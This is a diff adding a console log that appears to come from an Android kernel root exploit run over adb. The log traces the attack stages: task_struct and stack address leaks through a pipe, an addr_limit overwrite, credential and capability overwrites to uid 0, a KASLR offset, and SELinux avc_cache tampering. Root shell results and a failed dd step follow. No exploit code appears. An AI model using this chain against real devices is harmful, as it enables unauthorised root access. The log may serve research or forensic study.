@@ -1,0 +1,64 @@
+[>] Leak task_struct
+[+] Starting to write 0x1000 bytes in iov_pipe
+[+] Wrote 73728 bytes with writev in pipe
+[>] Leak task_struct
+	[+] Process is triggering unlink
+	[+] Process read 65537 bytes from iov_pipe
+	[+] Child process exiting
+[+] Read 4095 bytes from iov_pipe
+[+] thread is at: 0xfffffffe49b00c00
+[+] @waitqueue: 0xfffffffe49b00ca8
+[+] @task_struct=0xfffffffdd494d940
+[>] Read stack address
+	[+] Process is triggering unlink
+	[+] @thread_addr=fffffffe49b00c00
+[+] Read 4095 bytes from iov_pipe
+[+] thread is at: 0xfffffffe49b00c00
+[+] @waitqueue: 0xfffffffe49b00ca8
+[+] @task_struct=0xfffffffdd494d940
+[>] Read stack address
+	[+] Process read 4096 bytes from iov_pipe
+	[+] Child process exiting
+[+] @stack=fffffffdd5e9c000
+[>] Read thread_info address
+[+] @thread_info=fffffffdd5e9c000
+[>] Read addr_limit address
+	[+] Process is triggering unlink
+	[+] @thread_addr=fffffffe49b00c00
+[+] @stack=fffffffdd5e9c000
+[>] Read thread_info address
+[+] @thread_info=fffffffdd5e9c000
+[>] Read addr_limit address
+	[+] Process read 4096 bytes from iov_pipe
+	[+] Child process exiting
+[+] @addr_limit=0xfffffffdd5e9c008, addr_limit=8000000000
+[>] Overwrite addr_limit with 0xfffffffffffffffe
+[-] Can't open '/sys/fs/selinux/policy':  Permission denied
+[-] Could not load policy
+[+] struct_cred is at: 0xfffffffdd0142cc0
+[+] uid=2000, gid=2000
+[+] struct_cred has been overwritten
+[+] uid=0, gid=0
+[+] capabilities are overwritten !
+[+] SECCOMP is already disabled !
+[+] Kaslr offset is: 7c2a30000
+[+] @avc_cache=ffffff87cccc4c40
+[+] SID=875
+libsepol.policydb_index_others: security:  1 users, 4 roles, 2209 types, 0 bools
+libsepol.policydb_index_others: security: 1 sens, 1024 cats
+libsepol.policydb_index_others: security:  91 classes, 25985 rules, 0 cond rules
+MKTEST1790989566
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
+MKTEST1790989566
+MK11592604
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
+MK11592604
+MK3020613702
+dd_rc=1
+/system/bin/sh: <stdin>[8]: can't create /tmp/dd.err: No such file or directory
+cat: /tmp/dd.err: No such file or directory
+ls: /data/local/tmp/ram_34.bin: No such file or directory
+MK3020613702
+MK885615408
+rc=0
+MK885615408
